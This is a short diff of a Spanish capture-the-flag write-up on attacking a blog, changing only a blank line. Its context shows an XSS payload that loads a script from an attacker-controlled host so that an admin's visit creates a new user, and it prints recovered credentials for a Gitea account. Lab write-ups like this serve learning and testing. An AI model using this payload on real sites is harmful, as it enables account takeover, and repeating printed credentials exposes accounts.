@@ -147,6 +147,7 @@ document.getElementById("hacked_form").submit();
   "><script src = "http://192.168.17.128/doc.js"></script>
   ~~~ 
 - Nos montamos un server en Python y esperamos a que el admin entre al blog, por detrás se creará un nuevo usuario:
+
   ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/fd688fa7-60b4-4562-ad90-b25910b6aea5)
 
   - Y ahí lo tenemos, credenciales para el usuario `achilles:h2sBr9gryBunKdF9`, que podremos ingresar en Gitea desde el puerto 3000:
